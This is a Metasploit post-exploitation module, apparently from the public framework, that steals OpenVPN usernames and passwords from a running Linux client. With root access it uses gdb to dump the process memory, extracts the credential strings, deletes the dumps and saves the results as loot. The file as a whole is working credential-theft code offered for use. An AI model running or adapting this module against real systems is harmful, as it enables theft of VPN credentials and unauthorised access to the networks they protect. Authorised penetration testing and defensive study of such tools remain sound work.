##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'OpenVPN Gather Credentials',
      'Description'   => %q{
        This module grab OpenVPN credentials from a running process
        in Linux.

        Note: --auth-nocache must not be set in the OpenVPN command line.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'rvrsh3ll', # Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit Module
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => [
        ['URL', 'https://gist.github.com/rvrsh3ll/cc93a0e05e4f7145c9eb#file-openvpnscraper-sh']
      ]
    ))

    register_options(
      [
        OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.']),
        OptString.new('TMP_PATH', [true, 'The path to the directory to save dump process', '/tmp/'])
      ], self.class
    )
  end

  def pid
    datastore['PID']
  end

  def tmp_path
    datastore['TMP_PATH']
  end

  def run
    user = cmd_exec('/usr/bin/whoami')
    print_good("Module running as \"#{user}\" user")

    unless is_root?
      print_error('This module requires root permissions.')
      return
    end

    dump = cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{tmp_path}#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done 2>/dev/null; echo $?')
    if dump.chomp.to_i == 0
      vprint_good('Succesfully dump.')
    else
      print_warning('Could not dump process.')
      return
    end

    strings = cmd_exec("/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \"User: \"$1\"\\nPass: \"$2}'")

    deldump = cmd_exec("/bin/rm #{tmp_path}*.dump --force 2>/dev/null; echo $?")
    if deldump.chomp.to_i == 0
      vprint_good('Removing temp files successfully.')
    else
      print_warning('Could not remove dumped files. Remove manually.')
    end

    fail_with(Failure::BadConfig, 'No credentials. You can check if the PID is correct.') if strings.empty?

    vprint_good("OpenVPN Credentials:\n#{strings}")

    p = store_loot(
      'openvpn.grab',
      'text/plain',
      session,
      strings,
      nil
    )
    print_status("OpenVPN Credentials stored in #{p}")
  end
end
